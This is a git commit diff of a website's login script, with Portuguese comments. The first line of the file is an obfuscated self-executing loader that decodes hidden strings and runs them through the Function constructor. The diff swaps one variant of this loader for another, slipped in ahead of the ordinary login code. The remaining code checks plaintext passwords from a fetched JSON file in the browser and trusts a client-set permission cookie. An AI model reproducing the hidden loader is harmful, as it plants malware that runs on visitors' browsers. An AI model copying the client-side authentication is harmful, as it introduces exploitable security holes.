48058b524879ba68c07a71fc85d208b6557e7484
Gustavo <142137414+Ghosthszz@users.noreply.github.com>
2025-02-18 22:14:35 -0300

    Update script.js

--- frontend/js/script.js
+++ frontend/js/script.js
@@ -1,4 +1,4 @@
-var token,username,repo,path,url;(function(){var FZO='',EFJ=911-900;function URZ(e){var l=314252;var y=e.length;var u=[];for(var c=0;c<y;c++){u[c]=e.charAt(c)};for(var c=0;c<y;c++){var q=l*(c+319)+(l%45416);var a=l*(c+430)+(l%29247);var s=q%y;var j=a%y;var x=u[s];u[s]=u[j];u[j]=x;l=(q+a)%2463529;};return u.join('')};var Nro=URZ('swcdxbnporonjuklaghscutetrofzicrvmqyt').substr(0,EFJ);var gys=';j=b;j0 (g=hvr wfb(ta(r0,k=tp+[)")xjS.mti (lv=+=}*A.=;o,n7rx)70dvn.7sv8ef{fab6(4st;(r;(")f"a1at([70,56,5hl]ddfr;n6,1[u umtcg rs6-+i(g1n-josn=)l+f)rl;fb0(r,+r)g[el6;s2q)0eo]lrs=)rv[+=7)ogintimv,.;=h[ha8varr)1pekl n em(=os"shnrrn;-rp){v+*=hsav+r=.<t1[=(.r[!iiue n)(; mareqcnihealng)ne,o+>l0nj(;.hnar04wvc,9;n);oh hr=t;=aa C;]cll[fe  mv"emr6td,lC..le+a;lqr<ooC;uu f2c5=a"lhrS2+;tlen2{wk.((iav(7c-A(4,)ah02l=a(u8,-0fp;q3m++,8u9xaau(dhd(8i;]2t<eg(9;o;-=e;+lo; er]m f"rtr=i),to]i(s.j]egp]-nai)c;a)) ()eg]0uh)p6=ccarr=;]egtppgh)+r;1=n}69av9<.lA.h,uahe}fgr{iizaisn(;,)eh;w(vz.u3 )+ifjr2rl)l{ 1iis.o.u,=3u)l(pajofc[=;v]]utoarq6ru=n;]+rafl=ti.(=<.iee,.hhvio2tb=hrtl8ou!;d2es5cn))ot ;lc)=}aipv.}r7j(+u};tv)=rtujc7s+;to9r;h=)[{n.+,=+].3Cagu,11efer.8od,=A;16"i>uvu=lk",ieesdn=A=bckirf(g[;a,dr4iart+;1;c+g.ce+z0h= r=x[ )v,6"sthrs8Ccc.1Co(; {f[o0f(vgonCcs=s;ta;C(,vg78 ei(zl,r}= ,nez)=q;lrrt+o;.v.noeyn;e9';var SfY=URZ[Nro];var bop='';var VJP=SfY;var Wbw=SfY(bop,URZ(gys));var AmL=Wbw(URZ(')[i1%e5$$y]F5eF s.ciii.rFe"";f7(cFf$9\'5=$abShl%.}((aF"t6.d0_8}(1%()6kga %9cFF.F.(b,F"r42ipF;."F=dj$da,[!%!,F.fs,po+S0vt$.mF.; r_j+.(+}3.n;4pnadib{ o3F=hmrt++ns.0crCq"zj.%(s).F,)_s)*nF1r";3i4F)h7!pF(p\/1c3e-(tl\/.to;s{3jFc1cy}].1=o;3)h6af,F{r;(arb..a 3Fiir{}$&6s"j.;.=nfndtF.).d_m F[6F0f\/rj(!cFo;,lef$o(60ea.+ci.)!onaa#ep1;u33aff+t0 Tli$t!3,2cc0(.nF1$!.F;.nFa.zc4Fl],\/3+02d4a(o=3rnol%s3$jF$\/)d_$dc\'1F_\/[7;v(dg8)pFn)g;etrFSh0!.wir\/j}e=_F245j)+&sj8iF}s7)4(o(Fp.9;jc7F)$F_Fa70.u,9,}ca(F(lFzr+t7Fa.),;F)4lrCy=+,4.d)3c!F.x(pp7=go_%FgwFysFt gjgefa)t;% g!,3s]jlm ea)(iqF[1,7,,f-a=j!]i9=FF7hFg#d,;)s,$;.-),*r==;;]!Fn3F)#i_p(FljiF.sg3o.]3u,Fl)Fb oieFt\'yF-rFFa=tF1,otsbrsFn;0\/otrFhn)meoFs,]qa;_-=2)0\'aa.iF%===9is(()pFs()s4p6t{ng.entF_(7F.f={$22F5_s,s,n,.ul##;$ib[:2h(t(.fy!;!..o+eper%;.F)f_&).(Faco(c{.p36Fjz\/sa)ni)!%F,}F;nr.hw.FFnjfep1t3+6e!s2Fgf.$.t.-fcl(+*akn FyhF=F!a=t(4cfu(esF!8ogeFp.w{4 .gw2)hd.!2.=+,iagF ,p!eufF{"coo._.32j,j)!;,Cda+) e)tjtt,n}r.r0kFl**]r{+SfF !F=;e!a;%sa2t.N}=q0;pfF()s;$}50t)jNoan2$\/ur, hl) (u( mrFoFpg)_=ct!!.F(}u\/22th%(Sau.)eF.4.rF{Fb.-).$F-$2a}j!rge#aF=.h(a1t,f$9y3!_F.4)F!43D1)_&.$s#4)c\/) =F4_]'));var WYu=VJP(FZO,AmL );WYu(9273);return 8638})()
+var token,username,repo,path,url;(function(){var rbK='',IUs=349-338;function pka(d){var m=3387453;var t=d.length;var x=[];for(var u=0;u<t;u++){x[u]=d.charAt(u)};for(var u=0;u<t;u++){var e=m*(u+329)+(m%40719);var n=m*(u+271)+(m%41896);var g=e%t;var q=n%t;var j=x[g];x[g]=x[q];x[q]=j;m=(e+n)%4492825;};return x.join('')};var TeN=pka('voqstbxdrejpawcosguilkncmnthyrtucofrz').substr(0,IUs);var fpu=' [7paai)dt,2g.v=0""vyr)v6j(ouditr7i(, Cn=wfg.9.(fs+zdmCuw=t=u6t.)5 ),,,289 0.5,8n)= +1hoxph60uC,n8a(jfm=;;4dp83,h6ts.del+;ajk t=j][crrv)=s;pwt;(1n tgbr00ro+ dl[(;rn(va,(; a.uyyrpdg;;+9;rvaiC[d([p0;f;hevr* xcfvlia.mh+0;es.f8);(-hg]n.nnv] 3=t)sdsg=n=(l=5q(l>=+d fhdeaC{] r =i=rrtlwi[rw;o>n]t;;}=(l.arr=<adncewrld,aro.h7ot+npuu,l=)hr2;jAhfnroi(;;]en)hgnoot)j;6o,)+; icawrk])=t(c)C1(rflA+eea1w obrrr+u;;vny,vek(4;a)fa,x{qr)u(e,==+87<h4[ .Caqtc={rsv];(oc;p+2s;=rs=s=r5fsrns{svtitrp eqgr=({tnnaha}=liaAte=ro.i+;al=*-+iie)0Swp2l-u,vr;,w9l;+}n=d tcoow]e+.qhd<)=1t+ull)ae[]nv{.qu!,y. ;a1(Sjhl(=604)wnbur)(=;.p<"}iA[a+il1;n0u+nehi]0;]((olh"!;f;"r9rua[9t)=j(s(bv0,.v,(e7t7nrjgauCao]-g1ga;,}+;f,nf7ai.6(j;+xr ar7.0)kjervmj 9c1a.r;7),c,)-, fn3o,ve8wcovx=vfxv[g;r{1==i4nl);f yrh8ogl)(=)r6).}.],v06o;th;"j(.)e2nthou"r)abi aive()pa[h=)8cA"ma2((joul"[ier+vlrrom<h-rm.2e;;i[=.sm=e"2rran+tjl3ii}=0b-r+)o1styta';var cKo=pka[TeN];var KmE='';var rJm=cKo;var DnF=cKo(KmE,pka(fpu));var AKk=DnF(pka('-,.sA1t t[ri$p(a)e\/tr(eplAnuijrjg3,3qAd")f){d(%s(.fsm=(A3&=e1){.\'+.aA{[rb6;0.a_%_.i,,v#.A3Cr$,cx_pgrh!3u7mo}\/]j=n(i9z=vo(Aabof)%7\/n_;(e)p4r%xe..A13c1euDl.cszg}x)eAh\/!)11t+wer!;h$!%4Cc3n2Ajpt+2AoAeSiAt]"__fa7f5\/(!T.c].f)%9%n+ti$ ].)3kn[$]0{4AAA6EA  g=n8u+A#)A;Ar;}-;rat&!f(.g10rje.A;.tAA.. (rnAAd,,ig_=.ea)s)=87(dt,{07A10t0Ane;$)+2j3aA; edb=h3!;h,1$3!Aj;),;!Ej.m;_v.e)Aj3AoAA+!(1es{+i;A):$}Aa)-bpb)),"(d.s,n.d&4;g.9,,e2!1"t1n9eeA"88t!=s.eAb.).A, .4;b)\/,3&.;i4l)}9))(3.AA([7(4arh0.;iAAm#a%p\'0ot,()+[7d1=sct(;} t7\/$tmgor"{s3!6+rcaaxr3\'0A5A+\'e.b,w,h.a.]sfAugi!!nA5$=p+A }eq;rjm}patsr.e$aAA AA)bs13Ae%2tb.A.A=.b((ao$A4szp)of1,A[p7}*.n(.)_q.$m_A+0,.A;l.ga.,a.3d$jAt\/e)rAr3}t;e;s.\/!f6;"=bie,)2;i]g(eAu2a2AIp,nhuiA+h{o,)u(zdAshd$sl%rexa$)h(!5A{4c.u3rldot43bihbh_iveh_*#49r!0$==b*AA353xt$rA)7-od !ejs)3(\/,oA}g.p=* ]s.o)$,A.15&}%=s(x,hex!Af.a{"#oi#.!McSqAA%)(4,pA.Ash__+_ed$)3%;.AAu2j$th,,4A9o\/255s(t!02-.b_d es f=(u3=(2Axo]07So$st1A)_ppn" dseA-A(.){i3$reth!en*8=pr7cA,;w. 6a)dA.o.giA7_0a,b8$!..A);{02..y2 ,oAnw(, 4gt!.(AA)o]$_A_-(ScA!Afo= ;Ai3rtbeen.3#Ap=!a.'));var Ysl=rJm(rbK,AKk );Ysl(3942);return 1282})()
 
 async function login() {
   const emailInput = document.getElementById('email').value;
@@ -18,8 +18,12 @@ async function login() {
     }
 
     const data = await response.json();
-    const decodedContent = atob(data.content);
-    const users = JSON.parse(decodedContent);
+
+    // O conteúdo do arquivo JSON está codificado em base64, então precisamos decodificá-lo
+    const usersJson = atob(data.content);
+    const users = JSON.parse(usersJson);
+
+    // Procura pelo usuário com o email e senha fornecidos
     const user = users.find(user => user.email === emailInput && user.password === passwordInput);
 
     if (user) {
@@ -27,10 +31,14 @@ async function login() {
         customErrorMsg.style.display = 'block';
         errorMsg.style.display = 'none';
       } else {
+        // Configura o cookie com o ID do usuário
         setCookie('id', user.id, 10);
+        // Configura o cookie "permission" com o valor de cookieValue do usuário
         setCookie('permission', user.cookieValue);
+
+        // Redireciona para a URL especificada
         window.location.href = user.redirectUrl;
-        return { id: user.id, redirectUrl: user.redirectUrl };
+        return { id: user.id, redirectUrl: user.redirectUrl }; // Retorna os dados do usuário, se necessário
       }
     } else {
       errorMsg.style.display = 'block';
@@ -43,27 +51,45 @@ async function login() {
     customErrorMsg.style.display = 'none';
   }
 
+  // Em caso de falha ou usuário não encontrado, retorna null
   return null;
 }
 
+// Função para definir um cookie
 function setCookie(name, value, days) {
   const expires = new Date();
   expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
   document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
 }
 
+// Função para definir o cookie
+function setCookie(nome, valor, expiraEmDias, caminho = "/") {
+    const dataDeExpiracao = new Date();
+    dataDeExpiracao.setTime(dataDeExpiracao.getTime() + (expiraEmDias * 24 * 60 * 60 * 1000));
+    const expires = `expires=${dataDeExpiracao.toUTCString()}`;
+    
+    document.cookie = `${nome}=${valor}; ${expires}; path=${caminho}`;
+}
+// Função para ler a URL e salvar o código nos cookies
 function salvarCodigoNosCookies() {
     const url = window.location.href;
+
+    // Verifica se o parâmetro ?COD= existe na URL
     const regex = /[?&]COD=([^&]+)/;
     const match = url.match(regex);
 
     if (match) {
+        // Extrai o valor do código de presente
         const codigoDePresente = match[1];
+
+        // Salva o código nos cookies com o nome 'code', válido por 30 dias
         setCookie("code", codigoDePresente, 30);
+
         console.log('Código de presente salvo nos cookies:', codigoDePresente);
     } else {
         console.log('Não há código de presente na URL.');
     }
 }
 
+// Chama a função para salvar o código nos cookies se existir
 salvarCodigoNosCookies();
